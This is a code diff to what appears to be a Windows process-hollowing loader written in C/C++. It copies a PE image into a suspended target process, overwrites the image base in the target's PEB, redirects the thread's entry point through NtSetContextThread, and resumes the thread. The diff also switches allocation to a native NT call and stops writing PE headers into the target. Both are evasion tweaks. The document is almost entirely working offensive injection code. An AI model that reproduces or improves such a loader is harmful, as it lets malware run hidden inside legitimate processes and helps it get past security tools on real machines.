@@ -19,16 +19,18 @@ _NtSetContextThread myNtSetContextThread = (_NtSetContextThread)GetProcAddress(G
 bool copyPEinTargetProcess(HANDLE pHandle, LPVOID allocAddrOnTarget, PPE_STRUCT myPE)
 {
 
-	//myPE->ntHeader->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
+	myPE->ntHeader->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
+	NTSTATUS status = 0;
+	/*
 	_dbg("[+] Writing Header into target process\r\n");
-	NTSTATUS status = myNtWrite(pHandle, allocAddrOnTarget, myPE->imageBase, myPE->ntHeader->OptionalHeader.SizeOfHeaders, NULL);
+	status = myNtWrite(pHandle, allocAddrOnTarget, myPE->imageBase, myPE->ntHeader->OptionalHeader.SizeOfHeaders, NULL);
 	if (status != 0)
 	{
 		_err("[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x\r\n", status);
 		return FALSE;
 	}
 	_dbg("\t[+] Headers written at : 0x%p\n", allocAddrOnTarget);
-
+	*/
 	_dbg("[+] Writing section into target process\r\n");
 	for (int i = 0; i < myPE->ntHeader->FileHeader.NumberOfSections; i++)
 	{
@@ -690,7 +692,7 @@ BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIM
 	return TRUE;
 }
 
-BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myPE, PVOID allocAddrOnTarget)
+BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myPE)
 {
 	CONTEXT CTX = {};
 	CTX.ContextFlags = CONTEXT_FULL;
@@ -702,14 +704,14 @@ BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myP
 		return FALSE;
 	}
 
-	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &allocAddrOnTarget, sizeof(DWORD64), nullptr);
+	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
 	if (status != 0)
 	{
 		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
 		return FALSE;
 	}
 
-	CTX.Rcx = (DWORD64)allocAddrOnTarget + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
+	CTX.Rcx = (DWORD64)myPE->ntHeader->OptionalHeader.ImageBase + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
 
 	status = myNtSetContextThread(pi->hThread, &CTX);
 	if (status != 0)
@@ -799,7 +801,13 @@ int main(int argc, char** argv)
 		exit(1);
 
 	LPVOID allocAddrOnTarget = NULL;
-	allocAddrOnTarget = VirtualAllocEx(pi->hProcess, NULL,  myPE->ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	SIZE_T sizeAlloc = myPE->ntHeader->OptionalHeader.SizeOfImage;
+	NTSTATUS status = myNtAlloc(pi->hProcess, &allocAddrOnTarget, NULL, &sizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (status != 0)
+	{
+		_err("Error in allocation %x\r\n", status);
+		exit(1);
+	}
 	DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - myPE->ntHeader->OptionalHeader.ImageBase;
 
 	if (allocAddrOnTarget == NULL)
@@ -836,7 +844,7 @@ int main(int argc, char** argv)
 	if (!FixMemPermissionsEx(pi->hProcess, (ULONG_PTR)allocAddrOnTarget, myPE->ntHeader, myPE->sections[0].header))
 		exit(1);
 
-	if (!overwriteEntryPointAndResumeThread(pi, myPE, allocAddrOnTarget))
+	if (!overwriteEntryPointAndResumeThread(pi, myPE))
 		exit(1);
 
 	DWORD bytesSize = 0;
